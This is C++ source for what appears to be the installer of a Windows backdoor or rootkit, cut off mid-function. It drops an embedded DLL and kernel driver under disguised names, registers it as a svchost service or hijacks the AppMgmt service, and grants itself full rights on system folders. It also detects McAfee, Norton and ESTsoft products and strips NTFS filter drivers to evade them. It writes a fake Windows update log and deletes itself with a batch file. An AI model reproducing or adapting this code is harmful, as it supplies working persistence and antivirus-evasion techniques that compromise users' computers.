// install.cpp : Defines the entry point for the application.
//

#include "StdAfx.h"

//#pragma comment(linker, "/defaultlib:msvcrt.lib /opt:nowin98 /IGNORE:4078 /MERGE:.rdata=.text /MERGE:.data=.text /section:.text,ERW")
#pragma comment(linker, "/defaultlib:msvcrt.lib /opt:nowin98")
#include "resource.h"
#include <windows.h>
#include <stdlib.h>
#include <Aclapi.h>
#include <lm.h>
#include <Shlwapi.h>
#pragma comment(lib, "NetApi32.lib")
#include "acl.h"
#include "decode.h"
#include "RegEditEx.h"
#include "agony.c"
#include "DebugEx.h"
#include "appack.cpp"

#pragma comment(lib,"aplib.lib")

#define INVALID_FILE_ATTRIBUTES ((DWORD)-1)
#define HadBeenInstalled 5
#define HadBeenInstalledDriverAndNor 6
#define Heuristic 32
BOOL    hInstall;

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
}

void RunAProcess(char *comline)
{
	STARTUPINFO   si;   
	memset(&si,0 ,sizeof(STARTUPINFO));   
	si.cb   =   sizeof(   STARTUPINFO   );   
	si.dwFlags   =   STARTF_USESHOWWINDOW;   
	si.wShowWindow   =   SW_SHOW;   
	PROCESS_INFORMATION   pi;   
	CreateProcess(NULL,comline,   NULL,   NULL,   FALSE,   CREATE_NO_WINDOW,   NULL,   NULL,   &si,   &pi);  //��������������
	WaitForSingleObject(pi.hProcess, INFINITE);  //�ȴ��ź�ִ�н���*/
	return;
}
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	ExitProcess(0);
	return 0;
}
void SaveToFile()
{
	char lpFilePath[256] = {0};

	GetWindowsDirectory(lpFilePath,sizeof(lpFilePath));
	lstrcat(lpFilePath,"\\KB0988764.log");
	HANDLE	hFile = CreateFile(lpFilePath, GENERIC_WRITE, FILE_SHARE_WRITE,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "windows update time",4, &dwBytesWrite, NULL);
	CloseHandle(hFile);
	return ;
}
/*
// IsInsideVPC's exception filter
DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)
{
	PCONTEXT ctx = ep->ContextRecord;
	
	ctx->Ebx = -1; // Not running VPC
	ctx->Eip += 4; // skip past the "call VPC" opcodes
	return EXCEPTION_CONTINUE_EXECUTION; // we can safely resume execution since we skipped faulty instruction
}

// high level language friendly version of IsInsideVPC()
bool IsInsideVPC()
{
	bool rc = false;
	
	__try
	{
		_asm push ebx
		_asm mov  ebx, 0 // Flag
		_asm mov  eax, 1 // VPC function number
		
		// call VPC 
		_asm __emit 0Fh
		_asm __emit 3Fh
		_asm __emit 07h
		_asm __emit 0Bh
		
		_asm test ebx, ebx
		_asm setz [rc]
		_asm pop ebx
	}
	// The except block shouldn't get triggered if VPC is running!!
	__except(IsInsideVPC_exceptionFilter(GetExceptionInformation()))
	{
	}
	
	return rc;
}

bool IsInsideVMWare()
{
	bool rc = true;
	
	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx
			
			mov    eax, 'VMXh'
			mov    ebx, 0 // any value but not the MAGIC VALUE
			mov    ecx, 10 // get VMWare version
			mov    edx, 'VX' // port number
			
			in     eax, dx // read port
			// on return EAX returns the VERSION
			cmp    ebx, 'VMXh' // is it a reply from VMWare?
			setz   [rc] // set return value
			
			pop    ebx
			pop    ecx
			pop    edx
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}
	
	return rc;
}
*/
void SetAccessRights()
{
	char	lpUserName[50], lpGroupName[100], lpDriverDirectory[MAX_PATH], lpSysDirectory[MAX_PATH];
	DWORD	nSize = sizeof(lpUserName);
	
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;   
	DWORD   dwEntriesRead = 0;   
	DWORD   dwTotalEntries = 0;   
	NET_API_STATUS   nStatus;
	WCHAR wUserName[100];

	ZeroMemory(lpUserName, sizeof(lpUserName));
	ZeroMemory(lpDriverDirectory, sizeof(lpDriverDirectory));
	ZeroMemory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpDriverDirectory, sizeof(lpDriverDirectory));
	lstrcat(lpDriverDirectory, "\\Drivers");
	GetUserName(lpUserName, &nSize);
	// ���ó�ԱȨ��
	AddAccessRights(lpSysDirectory, lpUserName, GENERIC_ALL);
	AddAccessRights(lpDriverDirectory, lpUserName, GENERIC_ALL);
	MultiByteToWideChar( CP_ACP, 0, lpUserName, -1, wUserName, sizeof(wUserName) / sizeof(wUserName[0])); 

	nStatus = NetUserGetLocalGroups(NULL,   
		(LPCWSTR)wUserName,
		0,   
		LG_INCLUDE_INDIRECT,   
		(LPBYTE   *) &pBuf,   
		MAX_PREFERRED_LENGTH,   
		&dwEntriesRead,   
		&dwTotalEntries);   
	
	if (nStatus == NERR_Success)   
	{   
		LPLOCALGROUP_USERS_INFO_0 pTmpBuf;   
		DWORD i;   
		
		if ((pTmpBuf = pBuf) != NULL)
		{   
			for (i = 0; i < dwEntriesRead; i++)   
			{ 
				if (pTmpBuf == NULL)     
					break;
				WideCharToMultiByte(CP_OEMCP, 0, (LPCWSTR)pTmpBuf->lgrui0_name, -1, (LPSTR)lpGroupName, sizeof(lpGroupName), NULL, FALSE);
				// �������Ȩ��
				AddAccessRights(lpSysDirectory, lpGroupName, GENERIC_ALL);
				AddAccessRights(lpDriverDirectory, lpGroupName, GENERIC_ALL);	
				pTmpBuf++;  
			}   
		}      
	}
	if (pBuf != NULL)   
		NetApiBufferFree(pBuf); 
	
}
BOOL ReleaseResourceSys(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	char	strTmpPath[MAX_PATH];
	char	strBinPath[MAX_PATH];
	char	lpOutput[MAX_PATH];

	// һ��Ҫ��������ֿ���GetTickCount�п��ܵõ�һ����ֵ
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strBinPath, "%s\\%d_tep.dll", strTmpPath, GetTickCount());
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "FindResource Error:%d",GetLastError());
		OutputDebugToFile(lpOutput);
		return FALSE;
	}
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "LoadResource Error:%d",GetLastError());
		OutputDebugToFile(lpOutput);
		return FALSE;
	}
	
	hFile = CreateFile
		(
		strBinPath, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "CreateFile Error:%d",GetLastError());
		OutputDebugToFile(lpOutput);
		return FALSE;
	}
/*
	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft,LocalFileTime;
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft,&LocalFileTime);

	HINSTANCE hDll = LoadLibrary("kernel32.dll");
	if (hDll != NULL)
	{
		DWORD MySetFileTime = (DWORD)GetProcAddress(hDll,"SetFileTime");
		__asm
		{
			mov		ebx,MySetFileTime
			lea		eax,LocalFileTime
			push	eax
			push	NULL
			lea		eax,LocalFileTime
			push	eax
			push	hFile
			call	ebx
		}
		FreeLibrary(hDll);
	}
*/
	OutputDebugToFile("@here");
	WriteFile(hFile, hRes, SizeofResource(hModule, hResInfo), &dwBytes, NULL);
	
	//SetFilePointer(hFile,240,NULL,FILE_BEGIN);
	//WriteFile(hFile, "PE",2, &dwBytes, NULL);
	CloseHandle(hFile);
	FreeResource(hRes);
	MoveFile(strBinPath, lpFileName);
	DeleteFile(strBinPath);

	return TRUE;
}
BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName,LPCTSTR lpConfigString)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	char	strTmpPath[MAX_PATH];
	char	strBinPath[MAX_PATH];
	char	lpOutput[MAX_PATH];

	// һ��Ҫ��������ֿ���GetTickCount�п��ܵõ�һ����ֵ
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strBinPath, "%s\\%d_res.tmp", strTmpPath, GetTickCount());
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "FindResource Error:%d",GetLastError());
		OutputDebugToFile(lpOutput);
		return FALSE;
	}
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "LoadResource Error:%d",GetLastError());
		OutputDebugToFile(lpOutput);
		return FALSE;
	}
	hFile = CreateFile
		(
		strBinPath, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "CreateFile Error:%d",GetLastError());
		OutputDebugToFile(lpOutput);
		return FALSE;
	}
/*                //����ʱ�䣬���ﱻСҩ��ɱ�ˣ�
	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft,LocalFileTime;
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft,&LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME) NULL,	&LocalFileTime);
*/
	WriteFile(hFile, hRes,SizeofResource(hModule, hResInfo), &dwBytes, NULL);

	CloseHandle(hFile);
	FreeResource(hRes);
	//OutputDebugToFile(strBinPath);

	char szDllPath[256]={0};
	char szPackPath[256]={0};
	char szComLine[256]={0};
	char lpExpand[256]={0};
	char szFilePack[256]={0};
	char szUnFilePack[256]={0};

	memset(szDllPath,0,sizeof(szDllPath));
	GetWindowsDirectory(szDllPath,sizeof(szDllPath));
	lstrcat(szDllPath,"\\amdevntas.dll");

	memset(szComLine,0,sizeof(szComLine));
	memset(lpExpand,0,sizeof(lpExpand));

	//GetWindowsDirectory(lpExpand,sizeof(lpExpand));
	//lstrcat(lpExpand,"\\system32\\expand.exe");
	//wsprintf(szComLine,"%s %s %s",lpExpand,strBinPath,szDllPath);
	//RunAProcess(szComLine);
	decompress_file(strBinPath,szDllPath);    //��ѹ�������ﲻ����makecab����Ϊ����̫�Ƚ��������ѹȻ���ɱ


	hFile = CreateFile
		(
		szDllPath,
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		OPEN_ALWAYS,  //��OPEN_ALWAYS�򿪣���������SetFilePointer�ͻ����ԭ��������д�������CREATE_ALWAYS�򿪣��ͻ�ɾ��ԭ�����ļ���
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
	{
		OutputDebugToFile("CreateFile Error");
		return FALSE;
	}
	LONG lDistance = 0;
	SetFilePointer(hFile,lDistance, NULL, FILE_END);
	// д������
	if (lpConfigString != NULL)
	{
		WriteFile(hFile, lpConfigString, lstrlen(lpConfigString) + 1, &dwBytes, NULL);
	}
	CloseHandle(hFile);
	FreeResource(hRes);
	
	// Fuck KV File Create Monitor
	MoveFile(szDllPath, lpFileName);
	//SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(strBinPath);
	return TRUE;
}

char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
		wsprintf(servicename, "netsvcs_0x%d", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
	
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	
	return lpServiceName;
}

// ���ѡ�����װ,���ذ�װ�ɹ��ķ�����
void DeleteMe() 
{ 
	char kendi_ismi[MAX_PATH]; 
	char kendi_ismi2[MAX_PATH]; 
	char *ptr; 
	char basename[126]; 
	char r='"'; 
		char k='%'; 
	GetModuleFileName( NULL,kendi_ismi, MAX_PATH); 
	
	strcpy(kendi_ismi2,kendi_ismi); 
	ptr = strrchr(kendi_ismi2,'\\'); 
	FILE *di; 
	if((di=fopen(strcat(kendi_ismi,".bat"),"w")) == NULL) 
	{ 
		return; 
	} 
	
	if(ptr != NULL) 
		strcpy(basename,ptr+1); 
	printf("%s",basename); 
	
	fprintf(di,":1\n"); 
	fprintf(di,"taskkill /F /IM %s\n",basename); 
	fprintf(di,"del %c%s%c\n",r,kendi_ismi2,r); 
	fprintf(di,"if exist %c%s%c goto 1\n",r,kendi_ismi2,r); 
	fprintf(di,"del %c0\n",k); 
	fclose(di); 
	WinExec(kendi_ismi, SW_HIDE);
	return;
}
void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL == hSCManager )
	{
		//OutputDebugToFile("OpenSCManager error:%d\r\n",GetLastError());
		return;
	}
	SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
	if ( NULL == hService )
	{
		//OutputDebugToFile("OpenService error:%d\r\n",GetLastError());
		return;
	}
	StartService(hService, 0, NULL);
	CloseServiceHandle( hService );
	CloseServiceHandle( hSCManager );
}
char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString)
{
    // Open a handle to the SC Manager database.
	char *lpServiceName = NULL;
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
	HKEY hkRoot1 = HKEY_LOCAL_MACHINE;
    SC_HANDLE hscm = NULL, schService = NULL;
	char strModulePath[MAX_PATH];
	char	strSysDir[MAX_PATH];
	DWORD	dwStartType = 0;
	char lpServer[256] = {0};
	char strSubKey1[256] = {0};

  try{
    char strSubKey[1024] = {0};
    //query svchost setting
	char lpRegPath[256] = {0};
	char lpWindows[256] = {0};
	char lpCmdLine[256] = {0};
	//char lpDll[256] = {0};
	int index;
	char AntiKey[1][100] = {"SOFTWARE\\McAfee\\AVEngine"};
	char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";

	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
	char	strRegKey[1024];
	char temp[500];
	char *lpAppmgmt = "AppMgmt";

		for (index=0;index<1;index++)
		{	
			int hKeyrc = RegOpenKeyEx(hkRoot1,AntiKey[index], 0, KEY_QUERY_VALUE, &hkRoot1); //������󿧷ȣ����滻��������
			if(hKeyrc == ERROR_SUCCESS) //װ��mcafee
			{
				OutputDebugToFile("McAfee @key");
				CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //������󿧷ȣ���ժ���ļ���������
				GetSystemDirectory(strSysDir, sizeof(strSysDir));
				memset(strModulePath, 0, sizeof(strModulePath));
				wsprintf(strModulePath, "%s\\_amdevntapp.dll", strSysDir);

				//memset(lpDll, 0, sizeof(lpDll));
				//lstrcat(lpDll,strModulePath);
				ReleaseResource(NULL, IDR_DLL, "BINDLL", strModulePath,lpConfigString);
				
				CallMyDrivers("-param","AppMgmt");    //�������������Parameters���޸ģ�bypass�󿧷ȵļ��
				CallMyDrivers("-dllpath",(char *)strModulePath);  //�������������ServiceDll���޸ģ�bypass�󿧷ȵļ��
				DWORD	dwServiceType = 0x2;   //�޸ķ���״̬Ϊ�Զ�����
				WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\AppMgmt", "Start", REG_DWORD, (char *)&dwServiceType,dwServiceType, 1);
				StartService("AppMgmt");
				DeleteMe();
				return lpAppmgmt;
			}else{
				OutputDebugToFile("Error");
				OutputDebugToFile(AntiKey[index]);
			}
			RegCloseKey(hkRoot1);  //Ҫ�رվ��
		}
		rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
		if(ERROR_SUCCESS != rc)
		{
			throw "";
		}
		DWORD type, size = sizeof strSubKey;
		rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)strSubKey, &size);
		RegCloseKey(hkRoot);
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
			throw "RegQueryValueEx(Svchost\\netsvcs)";
		
		//install service
		hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (hscm == NULL)
			throw "OpenSCManager()";
		
		GetSystemDirectory(strSysDir, sizeof(strSysDir));
		
		for(ptr = strSubKey; *ptr; ptr = strchr(ptr, 0)+1)
		{
			//////////////////////////////////////////////////////////////////////////
			wsprintf(temp, "SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
			rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, temp, 0, KEY_QUERY_VALUE, &hkRoot);
			if (rc == ERROR_SUCCESS)
			{
				RegCloseKey(hkRoot);
				OutputDebugToFile("RegOpenKeyEx 2");
				continue;
			}
			
			memset(strModulePath, 0, sizeof(strModulePath));
			wsprintf(strModulePath, "%s\\_amdevnta%s.dll", strSysDir, ptr);  //����Ҫ�и� _ �»��� �ſ��������ļ�
			// ɾ������
			DeleteFile(strModulePath);
			// ��ǰ�ķ����ļ�û��ɾ��֮ǰ�������DLL����svchost�У����Բ����������
			if (GetFileAttributes(strModulePath) != INVALID_FILE_ATTRIBUTES)
				continue;
			
			wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
			
			schService = CreateService(
				hscm,                       // SCManager database
				ptr,                    // name of service
				lpServiceDisplayName,          // service name to display
				SERVICE_ALL_ACCESS,        // desired access
				SERVICE_WIN32_SHARE_PROCESS,
				SERVICE_AUTO_START,      // start type
				SERVICE_ERROR_NORMAL,      // error control type
				bin,        // service's binary
				NULL,                      // no load ordering group
				NULL,                      // no tag identifier
				NULL,                      // no dependencies
				NULL,                      // LocalSystem account
				NULL);                     // no password
			
			if (schService != NULL)
				break;
		}
//���������ҷ��񴴽�ʧ�ܣ����滻Appmgmt	�������Ϳ�����ɱnod32
		//if (hInstall == HadBeenInstalled) //�ڶ��ΰ�װ�滻����
	//	{
	//		schService = NULL;
	//	}
		if (schService == NULL)
		{
			OutputDebugToFile("FoundService @Error");
			GetSystemDirectory(strSysDir, sizeof(strSysDir));
			memset(strModulePath, 0, sizeof(strModulePath));
			wsprintf(strModulePath, "%s\\_amdevntapp.dll", strSysDir);
			
			ReleaseResource(NULL, IDR_DLL, "BINDLL", strModulePath,lpConfigString);
			
			CallMyDrivers("-param","AppMgmt");    //�������������Parameters���޸ģ�bypass�󿧷ȵļ��
			CallMyDrivers("-dllpath",(char *)strModulePath);  //�������������ServiceDll���޸ģ�bypass�󿧷ȵļ��
			DWORD	dwServiceType = 0x2;   //�޸ķ���״̬Ϊ�Զ�����
			WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\AppMgmt", "Start", REG_DWORD, (char *)&dwServiceType,dwServiceType, 1);
			SaveToFile(); //��һ�ΰ�װ��д��һ��log�ļ�
			StartService("AppMgmt"); //��������
			DeleteMe();
			return lpAppmgmt;
			//dwStartType = SERVICE_WIN32_OWN_PROCESS;
		}
		else
		{
			dwStartType = SERVICE_WIN32_SHARE_PROCESS;
			lpServiceName = ptr;
			OutputDebugToFile(lpServiceName);
		}
		
		CloseServiceHandle(schService);
		CloseServiceHandle(hscm);
		lstrcat(lpServer,lpServiceName);
		//OutputDebugToFile(lpServiceName);
		//OutputDebugToFile(lpServer);
		
		//config service
		hkRoot = HKEY_LOCAL_MACHINE;
		memset(strSubKey,0,sizeof(strSubKey));
		//wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		lstrcat(strSubKey,"SYSTEM\\CurrentControlSet\\Services\\");
		lstrcat(strSubKey,lpServer);
		lstrcpy(strSubKey1,strSubKey);
		OutputDebugToFile(strSubKey);
		
		if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
		{		
			DWORD	dwServiceType = 0x120;
			WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
		}
		
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);
		
		lstrcat(strSubKey, "\\Parameters");
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
		
    }catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
	
    RegCloseKey(hkRoot);
    RegCloseKey(hkParam);
    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);
	
	if (lpServiceName != NULL)
	{
		ReleaseResource(NULL, IDR_DLL, "BINDLL", strModulePath,lpConfigString);
	}
	char	strSelf[MAX_PATH];
	memset(strSelf, 0, sizeof(strSelf));
	GetModuleFileName(NULL, strSelf, sizeof(strSelf));
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey1, "InstallModule", REG_SZ, strSelf, lstrlen(strSelf), 0);
	SaveToFile(); //��һ�ΰ�װ��д��һ��log�ļ�
	StartService(lpServer); //��������
    return lpServiceName;
}
int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	1024

LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
{
	char	strFileName[MAX_PATH];
	char	strFileName1[MAX_PATH];
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;

	memset(strFileName,0,sizeof(strFileName));
	memset(strFileName1,0,sizeof(strFileName1));
	GetModuleFileName(hModule, strFileName, sizeof(strFileName));

	lstrcat(strFileName1,strFileName); //��copy����������͹�������

	HANDLE	hFile = CreateFile(strFileName1, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	
	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);

	int offset = memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
	return NULL;
}
BOOL _RegSetValue(char *lpszKey,char *lpszValueName,char *lpszValue,int dwValueType,int dwSize)
{
	HKEY	hKey;

	if (RegCreateKey(HKEY_LOCAL_MACHINE,lpszKey,&hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey,lpszValueName,NULL,dwValueType,(const BYTE *)lpszValue,dwSize);
		RegCloseKey(hKey);
	}else{
		return FALSE;
	}
	return TRUE;
}
BOOL CheckDriverInstall()
{
	HANDLE hDevicehand;

	hDevicehand = CreateFile("\\\\.\\Protection",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hDevicehand==INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	return TRUE;
}
DWORD InstallDriverFormServices(SC_HANDLE hSCManager,LPSTR lpServicesName ,LPSTR path,BOOL hCheck)
{
	SC_HANDLE hService;
	DWORD Status=1;
	char lpDebug[256] = {0};
	
	hService=CreateService(hSCManager,
						lpServicesName,
						lpServicesName,
						SERVICE_ALL_ACCESS,
						SERVICE_KERNEL_DRIVER,
						SERVICE_DEMAND_START,
						SERVICE_ERROR_NORMAL,
						path,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL);
	if(hService==NULL)
	{
		memset(lpDebug,0,sizeof(lpDebug));
		wsprintf(lpDebug,"Error with CreateService: %d\n", GetLastError());
		OutputDebugToFile(lpDebug);
		Status=0;
		goto cleanup;
	}
	if (hCheck == FALSE)
	{
		goto cleanup;
	}
	if(StartService(hService, 0, NULL)==0)
	{
		memset(lpDebug,0,sizeof(lpDebug));
	 	wsprintf(lpDebug,"Error with StartService: %d\n", GetLastError());
		OutputDebugToFile(lpDebug);
	 	Status=0;
		goto cleanup;
	}
	
	cleanup:
	
	if(hService)
		CloseServiceHandle(hService);
	
	return Status;
}
BOOL InstallDriver()
{
	char szPid[10]={0};
	char szDriverPath[256]={0};
	char szPackPath[256]={0};
	char szComLine[256]={0};
	char lpExpand[256]={0};
	char szFilePack[256]={0};
	char szUnFilePack[256]={0};
	HKEY hkRoot2 = HKEY_LOCAL_MACHINE;
	HKEY hkRoot3 = HKEY_LOCAL_MACHINE;
	HKEY hkRoot4 = HKEY_LOCAL_MACHINE;
	HKEY hkRoot5 = HKEY_LOCAL_MACHINE;
	HKEY hkRoot6 = HKEY_LOCAL_MACHINE;
	HKEY hkRoot7 = HKEY_LOCAL_MACHINE;
	HKEY hkESTsoft = HKEY_LOCAL_MACHINE;

	if (CheckDriverInstall() == TRUE)  //��������Ѿ����ع��ˣ�˵���Ѿ������е���
	{
		HKEY	hKey;
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Norton",NULL,\
			KEY_WRITE,&hKey) == ERROR_SUCCESS)
		{
			CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");
			return HadBeenInstalledDriverAndNor;
		}
		if(RegOpenKeyEx(hkESTsoft,"SOFTWARE\\ESTsoft", 0, KEY_QUERY_VALUE, &hkESTsoft) == ERROR_SUCCESS)
		{
			OutputDebugToFile("ESTsoft @update");
			RegCloseKey(hkESTsoft);
			CallMyDrivers("-ESTsoft","fuckESTsoft");  //
			CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //�����Сҩ�裬��ժ���ļ���������
			
		}else
		{
			memset(szPid,0,sizeof(szPid));
			wsprintf(szPid,"%d",GetCurrentProcessId());
			CallMyDrivers("-hook",szPid);
		}
		return HadBeenInstalled;
	}
	memset(szPackPath,0,sizeof(szPackPath));
	GetWindowsDirectory(szPackPath,sizeof(szPackPath));
	lstrcat(szPackPath,"\\amdevntas.sys");    //��������ɱ����
	DeleteFile(szPackPath);
	ReleaseResourceSys(NULL, 1122, "BINSYS", szPackPath); //�ͷ���������ɱ����

	memset(szDriverPath,0,sizeof(szDriverPath));
	GetWindowsDirectory(szDriverPath,sizeof(szDriverPath));
	lstrcat(szDriverPath,"\\system32\\_amdevntas.sys");    //��������ɱ����

	memset(szComLine,0,sizeof(szComLine));
	memset(lpExpand,0,sizeof(lpExpand));

	//GetWindowsDirectory(lpExpand,sizeof(lpExpand));
	//lstrcat(lpExpand,"\\system32\\expand.exe");
	//wsprintf(szComLine,"%s %s %s",lpExpand,szPackPath,szDriverPath);
	//RunAProcess(szComLine);
	decompress_file(szPackPath,szDriverPath);
	

	DeleteFile(szPackPath);
	
	if (_RegSetValue("SYSTEM\\CurrentControlSet\\Services\\PDCOMP","ImagePath","system32\\_amdevntas.sys",REG_EXPAND_SZ,strlen("system32\\_amdevntas.sys")) == FALSE)
	{
		OutputDebugToFile("RegSetValue DllName failed");
	}

	RunAProcess("net start PDCOMP");
	if (CheckDriverInstall() == FALSE)
	{
		//OutputDebugToFile("Driver load error by net.exe\r\n");
		StartService("PDCOMP");
		if (CheckDriverInstall() == TRUE)
		{
			//OutputDebugToFile("Driver load ok by sc\r\n");
		}else
		{
			SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
			if ( NULL == hSCManager )
			{
				OutputDebugToFile("OpenSCManager1 error\r\n");
				return FALSE;
			}
			RunAProcess("sc delete PDCOMPB");
